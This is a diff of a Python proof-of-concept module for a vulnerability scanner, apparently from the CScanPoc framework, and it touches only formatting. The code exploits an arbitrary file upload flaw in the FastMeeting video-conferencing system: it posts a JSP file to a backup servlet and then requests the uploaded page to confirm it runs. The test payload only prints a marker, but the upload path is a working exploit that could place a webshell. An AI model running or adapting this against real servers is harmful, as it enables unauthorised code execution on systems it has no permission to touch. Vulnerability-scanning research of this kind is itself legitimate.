@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'FastMeeting_0001'  # 平台漏洞编号，留空
     name = '好视通FastMeeting视频会议系统任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-08-12'  # 漏洞公布时间
     desc = '''
         好视通FastMeeting视频会议系统任意文件上传。
@@ -19,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'FastMeeting'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'a897ff33-d686-4567-8092-62380609be67'
@@ -33,7 +36,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2010-0132866
+            # refer: http://www.wooyun.org/bugs/wooyun-2010-0132866
             hh = hackhttp.hackhttp()
             arg = self.target
             upload_url = arg + '/dbbackup/servlet/backupServlet?action=sc'
@@ -60,11 +63,11 @@ Content-Type: text/plain
 <% out.println("testvul");%>
 ------WebKitFormBoundaryVsQhvGjUy0npvhbo--
             '''
-            code, head, res, err, _ = hh.http(upload_url,raw=raw)
-            if code==302 and 'info=upsucc' in head:
+            code, head, res, err, _ = hh.http(upload_url, raw=raw)
+            if code == 302 and 'info=upsucc' in head:
                 verify_url = arg + '/dbbackup/backup/test.jsp'
                 code, head, res, err, _ = hh.http(verify_url)
-                if code==200 and 'testvul' in res:
+                if code == 200 and 'testvul' in res:
                     #security_hole('Arbitrarilly file upload: '+arg+'AdminMgr/backup/databackup.jsp')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -74,6 +77,7 @@ Content-Type: text/plain
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
